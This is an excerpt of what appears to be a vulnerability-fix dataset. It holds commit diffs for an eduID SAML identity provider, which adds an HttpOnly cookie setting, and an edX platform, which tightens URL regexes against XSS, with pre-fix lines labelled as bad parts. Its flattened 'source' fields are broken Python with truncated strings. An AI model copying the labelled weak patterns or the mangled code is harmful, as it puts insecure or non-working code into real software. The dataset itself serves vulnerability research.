                    "source": "\n from setuptools import setup, find_packages import sys, os from distutils import versionpredicate here=os.path.abspath(os.path.dirname(__file__)) README=open(os.path.join(here, 'README')).read() version='0.3.22' install_requires=[ 'pymongo>=2.8,<3', 'pysaml2==1.2.0beta5', 'python-memcached==1.53', 'cherrypy==3.2.4', 'vccs_client==0.4.1', 'eduid_am>=0.5.3', ] testing_extras=[ 'nose==1.2.1', 'coverage==3.6', ] setup(name='eduid_idp', version=version, description=\"eduID SAML frontend IdP\", long_description=README, classifiers=[ ], keywords='eduID SAML', author='Fredrik Thulin', author_email='fredrik@thulin.net', license='BSD', packages=['eduid_idp',], package_dir={'': 'src'}, zip_safe=False, install_requires=install_requires, extras_require={ 'testing': testing_extras, }, entry_points={ 'console_scripts':['eduid_idp=eduid_idp.idp:main', ] } ) ",
                    "sourceWithComments": "#!/usr/bin/env python\n#\nfrom setuptools import setup, find_packages\nimport sys, os\nfrom distutils import versionpredicate\n\nhere = os.path.abspath(os.path.dirname(__file__))\nREADME = open(os.path.join(here, 'README')).read()\n\nversion = '0.3.22'\n\ninstall_requires = [\n    'pymongo>=2.8,<3',\n    'pysaml2==1.2.0beta5',\n    'python-memcached==1.53',\n    'cherrypy==3.2.4',\n    'vccs_client==0.4.1',\n    'eduid_am>=0.5.3',\n]\n\ntesting_extras = [\n    'nose==1.2.1',\n    'coverage==3.6',\n]\n\nsetup(name='eduid_idp',\n      version=version,\n      description=\"eduID SAML frontend IdP\",\n      long_description=README,\n      classifiers=[\n        # Get strings from http://pypi.python.org/pypi?%3Aaction=list_classifiers\n        ],\n      keywords='eduID SAML',\n      author='Fredrik Thulin',\n      author_email='fredrik@thulin.net',\n      license='BSD',\n      packages=['eduid_idp',],\n      package_dir = {'': 'src'},\n      #include_package_data=True,\n      #package_data = { },\n      zip_safe=False,\n      install_requires=install_requires,\n      extras_require={\n        'testing': testing_extras,\n        },\n      entry_points={\n        'console_scripts': ['eduid_idp=eduid_idp.idp:main',\n                            ]\n        }\n      )\n"
                },
                "/src/eduid_idp/config.py": {
                    "changes": [
                        {
                            "diff": "\n                     'content_packages': [],  # List of Python packages (\"name:path\") with content resources\n                     'verify_request_signatures': '0',  # '1' for True, '0' for False\n                     'status_test_usernames': [],\n-                    'signup_link': '#',  # for login.html\n-                    'dashboard_link': '#',  # for forbidden.html\n-                    'password_reset_link': '#',  # for login.html\n+                    'signup_link': '#',         # for login.html\n+                    'dashboard_link': '#',      # for forbidden.html\n+                    'password_reset_link': '#', # for login.html\n                     'default_language': 'en',\n                     'base_url': None,\n                     'default_eppn_scope': None,\n                     'authn_info_mongo_uri': None,\n-                    'max_authn_failures_per_month': '50',  # Kantara 30-day bad authn limit is 100\n+                    'max_authn_failures_per_month': '50', # Kantara 30-day bad authn limit is 100\n                     'login_state_ttl': '5',   # time to complete an IdP login, in minutes\n                     'default_scoped_affiliation': None,\n-                    'vccs_url': 'http://localhost:8550/',    # VCCS backend URL\n-                    'insecure_cookies': '0',                     # Set to 1 to not set HTTP Cookie 'secure' flag\n+                    'vccs_url': 'http://localhost:8550/', # VCCS backend URL\n+                    'insecure_cookies': '0', # Set to 1 to not set HTTP Cookie 'secure' flag\n+                    'httponly_cookies': '1', # Set to 0 to not protect against XSS vulnerabilities.\n                     }\n \n _CONFIG_SECTION = 'eduid_idp'\n",
                            "add": 7,
                            "remove": 6,
                            "filename": "/src/eduid_idp/config.py",
                            "badparts": [
                                "                    'signup_link': '#',  # for login.html",
                                "                    'dashboard_link': '#',  # for forbidden.html",
                                "                    'password_reset_link': '#',  # for login.html",
                                "                    'max_authn_failures_per_month': '50',  # Kantara 30-day bad authn limit is 100",
                                "                    'vccs_url': 'http://localhost:8550/',    # VCCS backend URL",
                                "                    'insecure_cookies': '0',                     # Set to 1 to not set HTTP Cookie 'secure' flag"
                            ],
                            "goodparts": [
                                "                    'signup_link': '#',         # for login.html",
                                "                    'dashboard_link': '#',      # for forbidden.html",
                                "                    'password_reset_link': '#', # for login.html",
                                "                    'max_authn_failures_per_month': '50', # Kantara 30-day bad authn limit is 100",
                                "                    'vccs_url': 'http://localhost:8550/', # VCCS backend URL",
                                "                    'insecure_cookies': '0', # Set to 1 to not set HTTP Cookie 'secure' flag",
                                "                    'httponly_cookies': '1', # Set to 0 to not protect against XSS vulnerabilities."
                            ]
                        }
                    ],
                    "source": "\n \"\"\" Configuration(file) handling for eduID IdP. \"\"\" import os import ConfigParser _CONFIG_DEFAULTS={'debug': False, 'syslog_debug': '0', 'num_threads': '8', 'logdir': None, 'logfile': None, 'syslog_socket': None, 'listen_addr': '0.0.0.0', 'listen_port': '8088', 'pysaml2_config': 'idp_conf.py', 'fticks_secret_key': None, 'fticks_format_string': 'F-TICKS/SWAMID/2.0 'static_dir': None, 'ssl_adapter': 'builtin', 'server_cert': None, 'server_key': None, 'cert_chain': None, 'userdb_mongo_uri': None, 'userdb_mongo_database': None, 'sso_session_lifetime': '15', 'sso_session_mongo_uri': None, 'raven_dsn': None, 'content_packages':[], 'verify_request_signatures': '0', 'status_test_usernames':[], 'signup_link': ' 'dashboard_link': ' 'password_reset_link': ' 'default_language': 'en', 'base_url': None, 'default_eppn_scope': None, 'authn_info_mongo_uri': None, 'max_authn_failures_per_month': '50', 'login_state_ttl': '5', 'default_scoped_affiliation': None, 'vccs_url': 'http://localhost:8550/', 'insecure_cookies': '0', } _CONFIG_SECTION='eduid_idp' class IdPConfig(object): \"\"\" Class holding IdP application configuration. Loads configuration from an INI-file at instantiation. :param filename: string, INI-file name :param debug: boolean, default debug value :raise ValueError: if INI-file can't be parsed \"\"\" def __init__(self, filename, debug): self._parsed_content_packages=None self._parsed_status_test_usernames=None self.section=_CONFIG_SECTION _CONFIG_DEFAULTS['debug']=str(debug) cfgdir=os.path.dirname(filename) _CONFIG_DEFAULTS['pysaml2_config']=os.path.join(cfgdir, _CONFIG_DEFAULTS['pysaml2_config']) self.config=ConfigParser.ConfigParser(_CONFIG_DEFAULTS) if not self.config.read([filename]): raise ValueError(\"Failed loading config file{!r}\".format(filename)) @property def num_threads(self): \"\"\" Number of worker threads to start(integer). EduID IdP spawns multiple threads to make use of all CPU cores in the password pre-hash function. Number of threads should probably be about 2x number of cores to 4x number of cores(if hyperthreading is available). \"\"\" return self.config.getint(self.section, 'num_threads') @property def logdir(self): \"\"\" Path to CherryPy logfiles(string). Something like '/var/log/idp' maybe. \"\"\" res=self.config.get(self.section, 'logdir') if not res: res=None return res @property def logfile(self): \"\"\" Path to application logfile. Something like '/var/log/idp/eduid_idp.log' maybe. \"\"\" res=self.config.get(self.section, 'logfile') if not res: res=None return res @property def syslog_socket(self): \"\"\" Syslog socket to log to(string). Something like '/dev/log' maybe. \"\"\" res=self.config.get(self.section, 'syslog_socket') if not res: res=None return res @property def debug(self): \"\"\" Set to True to log debug messages(boolean). \"\"\" return self.config.getboolean(self.section, 'debug') @property def syslog_debug(self): \"\"\" Set to True to log debug messages to syslog(also requires syslog_socket)(boolean). \"\"\" return self.config.getboolean(self.section, 'syslog_debug') @property def listen_addr(self): \"\"\" IP address to listen on. \"\"\" return self.config.get(self.section, 'listen_addr') @property def listen_port(self): \"\"\" The port the IdP authentication should listen on(integer). \"\"\" return self.config.getint(self.section, 'listen_port') @property def pysaml2_config(self): \"\"\" pysaml2 configuration file. Separate config file with SAML related parameters. \"\"\" return self.config.get(self.section, 'pysaml2_config') @property def fticks_secret_key(self): \"\"\" SAML F-TICKS user anonymization key. If this is set, the IdP will log FTICKS data on every login. \"\"\" return self.config.get(self.section, 'fticks_secret_key') @property def fticks_format_string(self): \"\"\" Get SAML F-TICKS format string. \"\"\" return self.config.get(self.section, 'fticks_format_string') @property def static_dir(self): \"\"\" Directory with static files to be served. \"\"\" return self.config.get(self.section, 'static_dir') @property def ssl_adapter(self): \"\"\" CherryPy SSL adapter class to use(must be one of cherrypy.wsgiserver.ssl_adapters) \"\"\" return self.config.get(self.section, 'ssl_adapter') @property def server_cert(self): \"\"\" SSL certificate filename(None==SSL disabled) \"\"\" return self.config.get(self.section, 'server_cert') @property def server_key(self): \"\"\" SSL private key filename(None==SSL disabled) \"\"\" return self.config.get(self.section, 'server_key') @property def cert_chain(self): \"\"\" SSL certificate chain filename \"\"\" return self.config.get(self.section, 'cert_chain') @property def userdb_mongo_uri(self): \"\"\" UserDB MongoDB connection URI(string). See MongoDB documentation for details. \"\"\" return self.config.get(self.section, 'userdb_mongo_uri') @property def userdb_mongo_database(self): \"\"\" UserDB database name. \"\"\" return self.config.get(self.section, 'userdb_mongo_database') @property def sso_session_lifetime(self): \"\"\" Lifetime of SSO session(in minutes). If a user has an active SSO session, they will get SAML assertions made without having to authenticate again(unless SP requires it through ForceAuthn). The total time a user can access a particular SP would therefor be this value, plus the pysaml2 lifetime of the assertion. \"\"\" return self.config.getint(self.section, 'sso_session_lifetime') @property def sso_session_mongo_uri(self): \"\"\" SSO session MongoDB connection URI(string). See MongoDB documentation for details. If not set, an in-memory SSO session cache will be used. \"\"\" return self.config.get(self.section, 'sso_session_mongo_uri') @property def raven_dsn(self): \"\"\" Raven DSN(string) for logging exceptions to Sentry. \"\"\" return self.config.get(self.section, 'raven_dsn') @property def content_packages(self): \"\"\" Get list of tuples with packages and paths to content resources, such as login.html. The expected format in the INI file is content_packages=pkg1:some/path/, pkg2:foo :return: list of(pkg, path) tuples \"\"\" if self._parsed_content_packages: return self._parsed_content_packages value=self.config.get(self.section, 'content_packages') res=[] for this in value.split(','): this=this.strip() name, _sep, path,=this.partition(':') res.append((name, path)) self._parsed_content_packages=res return res @property def verify_request_signatures(self): \"\"\" Verify request signatures, if they exist. This defaults to False since it is a trivial DoS to consume all the IdP:s CPU resources if this is set to True. \"\"\" res=self.config.get(self.section, 'verify_request_signatures') return bool(int(res)) @property def status_test_usernames(self): \"\"\" Get list of usernames valid for use with the /status URL. If this list is['*'], all usernames are allowed for /status. :return: list of usernames :rtype: list[string] \"\"\" if self._parsed_status_test_usernames: return self._parsed_status_test_usernames value=self.config.get(self.section, 'status_test_usernames') res=[x.strip() for x in value.split(',')] self._parsed_status_test_usernames=res return res @property def signup_link(self): \"\"\" URL(string) for use in simple templating of login.html. \"\"\" return self.config.get(self.section, 'signup_link') @property def dashboard_link(self): \"\"\" URL(string) for use in simple templating of forbidden.html. \"\"\" return self.config.get(self.section, 'dashboard_link') @property def password_reset_link(self): \"\"\" URL(string) for use in simple templating of login.html. \"\"\" return self.config.get(self.section, 'password_reset_link') @property def default_language(self): \"\"\" Default language code to use when looking for web pages('en'). \"\"\" return self.config.get(self.section, 'default_language') @property def base_url(self): \"\"\" Base URL of the IdP. The default base URL is constructed from the Request URI, but for example if there is a load balancer/SSL terminator in front of the IdP it might be required to specify the URL of the service. \"\"\" return self.config.get(self.section, 'base_url') @property def default_eppn_scope(self): \"\"\" The scope to append to any unscoped eduPersonPrincipalName attributes found on users in the userdb. \"\"\" return self.config.get(self.section, 'default_eppn_scope') @property def authn_info_mongo_uri(self): \"\"\" Authn info(failed logins etc.) MongoDB connection URI(string). See MongoDB documentation for details. If not set, Kantara authn logs will not be maintained. \"\"\" return self.config.get(self.section, 'authn_info_mongo_uri') @property def max_authn_failures_per_month(self): \"\"\" Disallow login for a user after N failures in a given month. This is said to be an imminent Kantara requirement. \"\"\" return self.config.getint(self.section, 'max_authn_failures_per_month') @property def login_state_ttl(self): \"\"\" Lifetime of state kept in IdP login phase. This is the time, in minutes, a user has to complete the login phase. After this time, login cannot complete because the SAMLRequest, RelayState and possibly other needed information will be forgotten. \"\"\" return self.config.getint(self.section, 'login_state_ttl') @property def default_scoped_affiliation(self): \"\"\" Add a default eduPersonScopedAffiliation if none is returned from the attribute manager. \"\"\" return self.config.get(self.section, 'default_scoped_affiliation') @property def vccs_url(self): \"\"\" URL to use with VCCS client. BCP is to have an nginx or similar on localhost that will proxy requests to a currently available backend using TLS. \"\"\" return self.config.get(self.section, 'vccs_url') @property def insecure_cookies(self): \"\"\" Set to True to NOT set HTTP Cookie 'secure' flag(boolean). \"\"\" return self.config.getboolean(self.section, 'insecure_cookies') ",
                    "sourceWithComments": "#\n# Copyright (c) 2013, 2014 NORDUnet A/S\n# All rights reserved.\n#\n#   Redistribution and use in source and binary forms, with or\n#   without modification, are permitted provided that the following\n#   conditions are met:\n#\n#     1. Redistributions of source code must retain the above copyright\n#        notice, this list of conditions and the following disclaimer.\n#     2. Redistributions in binary form must reproduce the above\n#        copyright notice, this list of conditions and the following\n#        disclaimer in the documentation and/or other materials provided\n#        with the distribution.\n#     3. Neither the name of the NORDUnet nor the names of its\n#        contributors may be used to endorse or promote products derived\n#        from this software without specific prior written permission.\n#\n# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS\n# \"AS IS\" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT\n# LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS\n# FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE\n# COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,\n# INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,\n# BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;\n# LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER\n# CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT\n# LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN\n# ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE\n# POSSIBILITY OF SUCH DAMAGE.\n#\n# Author : Fredrik Thulin <fredrik@thulin.net>\n#\n\"\"\"\nConfiguration (file) handling for eduID IdP.\n\"\"\"\n\nimport os\nimport ConfigParser\n\n_CONFIG_DEFAULTS = {'debug': False,  # overwritten in IdPConfig.__init__()\n                    'syslog_debug': '0',              # '1' for True, '0' for False\n                    'num_threads': '8',\n                    'logdir': None,\n                    'logfile': None,\n                    'syslog_socket': None,            # syslog socket to log to (/dev/log maybe)\n                    'listen_addr': '0.0.0.0',\n                    'listen_port': '8088',\n                    'pysaml2_config': 'idp_conf.py',  # path prepended in IdPConfig.__init__()\n                    'fticks_secret_key': None,\n                    'fticks_format_string': 'F-TICKS/SWAMID/2.0#TS={ts}#RP={rp}#AP={ap}#PN={pn}#AM={am}#',\n                    'static_dir': None,\n                    'ssl_adapter': 'builtin',  # one of cherrypy.wsgiserver.ssl_adapters\n                    'server_cert': None,  # SSL cert filename\n                    'server_key': None,   # SSL key filename\n                    'cert_chain': None,   # SSL certificate chain filename, or None\n                    'userdb_mongo_uri': None,\n                    'userdb_mongo_database': None,\n                    'sso_session_lifetime': '15',  # Lifetime of SSO session in minutes\n                    'sso_session_mongo_uri': None,\n                    'raven_dsn': None,\n                    'content_packages': [],  # List of Python packages (\"name:path\") with content resources\n                    'verify_request_signatures': '0',  # '1' for True, '0' for False\n                    'status_test_usernames': [],\n                    'signup_link': '#',  # for login.html\n                    'dashboard_link': '#',  # for forbidden.html\n                    'password_reset_link': '#',  # for login.html\n                    'default_language': 'en',\n                    'base_url': None,\n                    'default_eppn_scope': None,\n                    'authn_info_mongo_uri': None,\n                    'max_authn_failures_per_month': '50',  # Kantara 30-day bad authn limit is 100\n                    'login_state_ttl': '5',   # time to complete an IdP login, in minutes\n                    'default_scoped_affiliation': None,\n                    'vccs_url': 'http://localhost:8550/',    # VCCS backend URL\n                    'insecure_cookies': '0',                     # Set to 1 to not set HTTP Cookie 'secure' flag\n                    }\n\n_CONFIG_SECTION = 'eduid_idp'\n\n\nclass IdPConfig(object):\n\n    \"\"\"\n    Class holding IdP application configuration.\n\n    Loads configuration from an INI-file at instantiation.\n\n    :param filename: string, INI-file name\n    :param debug: boolean, default debug value\n    :raise ValueError: if INI-file can't be parsed\n    \"\"\"\n\n    def __init__(self, filename, debug):\n        self._parsed_content_packages = None\n        self._parsed_status_test_usernames = None\n        self.section = _CONFIG_SECTION\n        _CONFIG_DEFAULTS['debug'] = str(debug)\n        cfgdir = os.path.dirname(filename)\n        _CONFIG_DEFAULTS['pysaml2_config'] = os.path.join(cfgdir, _CONFIG_DEFAULTS['pysaml2_config'])\n        self.config = ConfigParser.ConfigParser(_CONFIG_DEFAULTS)\n        if not self.config.read([filename]):\n            raise ValueError(\"Failed loading config file {!r}\".format(filename))\n\n    @property\n    def num_threads(self):\n        \"\"\"\n        Number of worker threads to start (integer).\n\n        EduID IdP spawns multiple threads to make use of all CPU cores in the password\n        pre-hash function.\n        Number of threads should probably be about 2x number of cores to 4x number of\n        cores (if hyperthreading is available).\n        \"\"\"\n        return self.config.getint(self.section, 'num_threads')\n\n    @property\n    def logdir(self):\n        \"\"\"\n        Path to CherryPy logfiles (string). Something like '/var/log/idp' maybe.\n        \"\"\"\n        res = self.config.get(self.section, 'logdir')\n        if not res:\n            res = None\n        return res\n\n    @property\n    def logfile(self):\n        \"\"\"\n        Path to application logfile. Something like '/var/log/idp/eduid_idp.log' maybe.\n        \"\"\"\n        res = self.config.get(self.section, 'logfile')\n        if not res:\n            res = None\n        return res\n\n    @property\n    def syslog_socket(self):\n        \"\"\"\n        Syslog socket to log to (string). Something like '/dev/log' maybe.\n        \"\"\"\n        res = self.config.get(self.section, 'syslog_socket')\n        if not res:\n            res = None\n        return res\n\n    @property\n    def debug(self):\n        \"\"\"\n        Set to True to log debug messages (boolean).\n        \"\"\"\n        return self.config.getboolean(self.section, 'debug')\n\n    @property\n    def syslog_debug(self):\n        \"\"\"\n        Set to True to log debug messages to syslog (also requires syslog_socket) (boolean).\n        \"\"\"\n        return self.config.getboolean(self.section, 'syslog_debug')\n\n    @property\n    def listen_addr(self):\n        \"\"\"\n        IP address to listen on.\n        \"\"\"\n        return self.config.get(self.section, 'listen_addr')\n\n    @property\n    def listen_port(self):\n        \"\"\"\n        The port the IdP authentication should listen on (integer).\n        \"\"\"\n        return self.config.getint(self.section, 'listen_port')\n\n    @property\n    def pysaml2_config(self):\n        \"\"\"\n        pysaml2 configuration file. Separate config file with SAML related parameters.\n        \"\"\"\n        return self.config.get(self.section, 'pysaml2_config')\n\n    @property\n    def fticks_secret_key(self):\n        \"\"\"\n        SAML F-TICKS user anonymization key. If this is set, the IdP will log FTICKS data\n        on every login.\n        \"\"\"\n        return self.config.get(self.section, 'fticks_secret_key')\n\n    @property\n    def fticks_format_string(self):\n        \"\"\"\n        Get SAML F-TICKS format string.\n        \"\"\"\n        return self.config.get(self.section, 'fticks_format_string')\n\n    @property\n    def static_dir(self):\n        \"\"\"\n        Directory with static files to be served.\n        \"\"\"\n        return self.config.get(self.section, 'static_dir')\n\n    @property\n    def ssl_adapter(self):\n        \"\"\"\n        CherryPy SSL adapter class to use (must be one of cherrypy.wsgiserver.ssl_adapters)\n        \"\"\"\n        return self.config.get(self.section, 'ssl_adapter')\n\n    @property\n    def server_cert(self):\n        \"\"\"\n        SSL certificate filename (None == SSL disabled)\n        \"\"\"\n        return self.config.get(self.section, 'server_cert')\n\n    @property\n    def server_key(self):\n        \"\"\"\n        SSL private key filename (None == SSL disabled)\n        \"\"\"\n        return self.config.get(self.section, 'server_key')\n\n    @property\n    def cert_chain(self):\n        \"\"\"\n        SSL certificate chain filename\n        \"\"\"\n        return self.config.get(self.section, 'cert_chain')\n\n    @property\n    def userdb_mongo_uri(self):\n        \"\"\"\n        UserDB MongoDB connection URI (string). See MongoDB documentation for details.\n        \"\"\"\n        return self.config.get(self.section, 'userdb_mongo_uri')\n\n    @property\n    def userdb_mongo_database(self):\n        \"\"\"\n        UserDB database name.\n        \"\"\"\n        return self.config.get(self.section, 'userdb_mongo_database')\n\n    @property\n    def sso_session_lifetime(self):\n        \"\"\"\n        Lifetime of SSO session (in minutes).\n\n        If a user has an active SSO session, they will get SAML assertions made\n        without having to authenticate again (unless SP requires it through\n        ForceAuthn).\n\n        The total time a user can access a particular SP would therefor be\n        this value, plus the pysaml2 lifetime of the assertion.\n        \"\"\"\n        return self.config.getint(self.section, 'sso_session_lifetime')\n\n    @property\n    def sso_session_mongo_uri(self):\n        \"\"\"\n        SSO session MongoDB connection URI (string). See MongoDB documentation for details.\n\n        If not set, an in-memory SSO session cache will be used.\n        \"\"\"\n        return self.config.get(self.section, 'sso_session_mongo_uri')\n\n    @property\n    def raven_dsn(self):\n        \"\"\"\n        Raven DSN (string) for logging exceptions to Sentry.\n        \"\"\"\n        return self.config.get(self.section, 'raven_dsn')\n\n    @property\n    def content_packages(self):\n        \"\"\"\n        Get list of tuples with packages and paths to content resources, such as login.html.\n\n        The expected format in the INI file is\n\n            content_packages = pkg1:some/path/, pkg2:foo\n\n        :return: list of (pkg, path) tuples\n        \"\"\"\n        if self._parsed_content_packages:\n            return self._parsed_content_packages\n        value = self.config.get(self.section, 'content_packages')\n        res = []\n        for this in value.split(','):\n            this = this.strip()\n            name, _sep, path, = this.partition(':')\n            res.append((name, path))\n        self._parsed_content_packages = res\n        return res\n\n    @property\n    def verify_request_signatures(self):\n        \"\"\"\n        Verify request signatures, if they exist.\n\n        This defaults to False since it is a trivial DoS to consume all the IdP:s\n        CPU resources if this is set to True.\n        \"\"\"\n        res = self.config.get(self.section, 'verify_request_signatures')\n        return bool(int(res))\n\n    @property\n    def status_test_usernames(self):\n        \"\"\"\n        Get list of usernames valid for use with the /status URL.\n\n        If this list is ['*'], all usernames are allowed for /status.\n\n        :return: list of usernames\n\n        :rtype: list[string]\n        \"\"\"\n        if self._parsed_status_test_usernames:\n            return self._parsed_status_test_usernames\n        value = self.config.get(self.section, 'status_test_usernames')\n        res = [x.strip() for x in value.split(',')]\n        self._parsed_status_test_usernames = res\n        return res\n\n    @property\n    def signup_link(self):\n        \"\"\"\n        URL (string) for use in simple templating of login.html.\n        \"\"\"\n        return self.config.get(self.section, 'signup_link')\n\n    @property\n    def dashboard_link(self):\n        \"\"\"\n        URL (string) for use in simple templating of forbidden.html.\n        \"\"\"\n        return self.config.get(self.section, 'dashboard_link')\n\n    @property\n    def password_reset_link(self):\n        \"\"\"\n        URL (string) for use in simple templating of login.html.\n        \"\"\"\n        return self.config.get(self.section, 'password_reset_link')\n\n    @property\n    def default_language(self):\n        \"\"\"\n        Default language code to use when looking for web pages ('en').\n        \"\"\"\n        return self.config.get(self.section, 'default_language')\n\n    @property\n    def base_url(self):\n        \"\"\"\n        Base URL of the IdP. The default base URL is constructed from the\n        Request URI, but for example if there is a load balancer/SSL\n        terminator in front of the IdP it might be required to specify\n        the URL of the service.\n        \"\"\"\n        return self.config.get(self.section, 'base_url')\n\n    @property\n    def default_eppn_scope(self):\n        \"\"\"\n        The scope to append to any unscoped eduPersonPrincipalName\n        attributes found on users in the userdb.\n        \"\"\"\n        return self.config.get(self.section, 'default_eppn_scope')\n\n    @property\n    def authn_info_mongo_uri(self):\n        \"\"\"\n        Authn info (failed logins etc.) MongoDB connection URI (string).\n        See MongoDB documentation for details.\n\n        If not set, Kantara authn logs will not be maintained.\n        \"\"\"\n        return self.config.get(self.section, 'authn_info_mongo_uri')\n\n    @property\n    def max_authn_failures_per_month(self):\n        \"\"\"\n        Disallow login for a user after N failures in a given month.\n\n        This is said to be an imminent Kantara requirement.\n        \"\"\"\n        return self.config.getint(self.section, 'max_authn_failures_per_month')\n\n    @property\n    def login_state_ttl(self):\n        \"\"\"\n        Lifetime of state kept in IdP login phase.\n\n        This is the time, in minutes, a user has to complete the login phase.\n        After this time, login cannot complete because the SAMLRequest, RelayState\n        and possibly other needed information will be forgotten.\n        \"\"\"\n        return self.config.getint(self.section, 'login_state_ttl')\n\n    @property\n    def default_scoped_affiliation(self):\n        \"\"\"\n        Add a default eduPersonScopedAffiliation if none is returned from the\n        attribute manager.\n        \"\"\"\n        return self.config.get(self.section, 'default_scoped_affiliation')\n\n    @property\n    def vccs_url(self):\n        \"\"\"\n        URL to use with VCCS client. BCP is to have an nginx or similar on\n        localhost that will proxy requests to a currently available backend\n        using TLS.\n        \"\"\"\n        return self.config.get(self.section, 'vccs_url')\n\n    @property\n    def insecure_cookies(self):\n        \"\"\"\n        Set to True to NOT set HTTP Cookie 'secure' flag (boolean).\n        \"\"\"\n        return self.config.getboolean(self.section, 'insecure_cookies')\n"
                }
            },
            "msg": "Set httponly flag to protect against common XSS vulnerabilities"
        }
    },
    "https://github.com/ExtensionEngine/ed2go-edx-platform": {
        "4e4c209ae3deb4c78bcec89c181516af8604b450": {
            "url": "https://api.github.com/repos/ExtensionEngine/ed2go-edx-platform/commits/4e4c209ae3deb4c78bcec89c181516af8604b450",
            "html_url": "https://github.com/ExtensionEngine/ed2go-edx-platform/commit/4e4c209ae3deb4c78bcec89c181516af8604b450",
            "sha": "4e4c209ae3deb4c78bcec89c181516af8604b450",
            "keyword": "XSS malicious",
            "diff": "diff --git a/lms/urls.py b/lms/urls.py\nindex 776a518599..fe9882b180 100644\n--- a/lms/urls.py\n+++ b/lms/urls.py\n@@ -223,27 +223,27 @@\n             'courseware.views.course_info', name=\"info\"),\n         url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',\n             'courseware.views.syllabus', name=\"syllabus\"),   # TODO arjun remove when custom tabs in place, see courseware/courses.py\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/$',\n             'staticbook.views.index', name=\"book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/(?P<page>\\d+)$',\n             'staticbook.views.index'),\n         url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book-shifted/(?P<page>[^/]*)$',\n             'staticbook.views.index_shifted'),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/$',\n+            'staticbook.views.pdf_index', name=\"pdf_book\"),\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/(?P<page>\\d+)$',\n             'staticbook.views.pdf_index', name=\"pdf_book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n-            'staticbook.views.pdf_index'),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n-            'staticbook.views.pdf_index'),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',\n-            'staticbook.views.pdf_index'),\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',\n+            'staticbook.views.pdf_index', name=\"pdf_book\"),\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/(?P<page>\\d+)$',\n+            'staticbook.views.pdf_index', name=\"pdf_book\"),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/$',\n+            'staticbook.views.html_index', name=\"html_book\"),\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',\n             'staticbook.views.html_index', name=\"html_book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n-            'staticbook.views.html_index'),\n \n         url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',\n             'courseware.views.index', name=\"courseware\"),\n",
            "message": "",
            "files": {
                "/lms/urls.py": {
                    "changes": [
                        {
